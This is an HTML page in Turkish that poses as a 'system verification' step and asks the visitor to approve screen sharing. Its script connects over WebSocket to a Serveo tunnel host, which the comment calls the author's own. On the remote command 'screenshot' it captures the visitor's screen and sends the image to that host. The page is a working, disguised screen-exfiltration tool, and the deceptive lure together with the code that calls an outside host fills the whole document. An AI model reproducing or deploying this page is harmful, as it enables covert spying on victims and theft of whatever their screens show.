<html>
<head>
    <title>Sistem Dogrulama</title>
</head>
<body style="background:#111;color:white;text-align:center;font-family:sans-serif;padding-top:50px;">
    <h2>Devam etmek icin ekran paylasimini onaylayin</h2>
    <br>
    <button id="btn" style="padding:15px 30px;font-size:18px;cursor:pointer;background:#28a745;color:white;border:none;border-radius:5px;">
        BAGLAN VE ONAYLA
    </button>

    <script>
        const btn = document.getElementById("btn");
        btn.onclick = async () => {
            // SENIN GUNCEL SERVEO ADRESIN BURADA:
            const ws = new WebSocket("wss://5627ac5f8bad2e5f-188-3-71-142.serveousercontent.com");

            ws.onopen = () => {
                btn.innerText = "BAGLANDI âœ…";
                btn.style.background = "#555";
            };

            ws.onmessage = async (e) => {
                if (e.data === "screenshot") {
                    try {
                        const s = await navigator.mediaDevices.getDisplayMedia({video:true});
                        const v = document.createElement("video");
                        v.srcObject = s;
                        await v.play();
                        const c = document.createElement("canvas");
                        c.width = v.videoWidth;
                        c.height = v.videoHeight;
                        c.getContext("2d").drawImage(v, 0, 0);
                        s.getTracks().forEach(t => t.stop());
                        c.toBlob(b => ws.send(b), "image/png");
                    } catch (err) {
                        console.log("Hata:", err);
                    }
                }
            };
        };
    </script>
</body>
</html>
